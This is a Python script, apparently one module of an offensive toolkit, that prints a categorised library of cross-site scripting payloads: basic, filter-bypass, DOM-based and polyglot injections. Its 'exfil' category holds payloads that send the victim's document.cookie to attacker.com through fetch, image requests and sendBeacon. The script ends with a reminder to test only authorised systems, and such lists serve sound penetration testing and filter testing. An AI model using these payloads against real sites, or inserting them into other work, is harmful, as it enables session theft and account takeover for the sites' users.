"""XSS Payloads — Module 116. Context-aware XSS payload generation."""
import sys

PAYLOADS = {
    "basic": [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</title><script>alert(1)</script>',
        '<iframe src="javascript:alert(1)">',
    ],
    "filter_bypass": [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script >alert(1)</script >',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<img src=x oneRRor=alert(1)>',
        '<svg/onload=alert(1)>',
        '<img src=x onerror="alert`1`">',
        'javascript:alert(1)//',
        'data:text/html,<script>alert(1)</script>',
        '<<script>alert(1)//<</script>',
        '<script>al\u0065rt(1)</script>',
        '<details open ontoggle=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
    ],
    "dom": [
        '#"><img src=x onerror=alert(1)>',
        'javascript:void(document.write("<script>alert(1)<\\/script>"))',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        "';alert(1)//",
        '";alert(1)//',
        '</script><script>alert(1)</script>',
        '${alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
    ],
    "exfil": [
        '<script>fetch("https://attacker.com/c="+document.cookie)</script>',
        '<img src=x onerror="this.src=\'https://attacker.com/x?c=\'+btoa(document.cookie)">',
        '<script>new Image().src="https://attacker.com/?c="+encodeURIComponent(document.cookie)</script>',
        '<script>navigator.sendBeacon("https://attacker.com/",document.cookie)</script>',
    ],
    "polyglot": [
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        '\'\';!--"<XSS>=&{()}',
        '<script src="data:,alert(1)">',
    ],
}

def main():
    print("[MODULE 116] XSS PAYLOADS")
    print("[SOURCE]     Local payload library — no external calls")
    print()
    raw = (sys.argv[1].strip() if len(sys.argv) > 1 else "").strip().lower()

    cats = list(PAYLOADS.keys())
    if raw in cats:
        selected = {raw: PAYLOADS[raw]}
    elif raw == "all":
        selected = PAYLOADS
    elif raw in ("exfil","exfiltration","steal"):
        selected = {"exfil": PAYLOADS["exfil"]}
    else:
        selected = PAYLOADS

    total = 0
    for cat, payloads in selected.items():
        print(f"[CATEGORY]  {cat.upper()}")
        for i, p in enumerate(payloads, 1):
            print(f"  [{i:02d}] {p}")
        print()
        total += len(payloads)

    print(f"[TOTAL]  {total} payloads")
    print()
    print("[CATEGORIES]  basic | filter_bypass | dom | exfil | polyglot | all")
    print("[USAGE]        xss_payloads.py dom        — DOM-based payloads only")
    print("[USAGE]        xss_payloads.py exfil      — cookie exfiltration payloads")
    print()
    print("[REMINDER] Only test against systems you own or have written permission to test.")
    print("[DONE] XSS payload generation complete.")

if __name__ == "__main__":
    main()
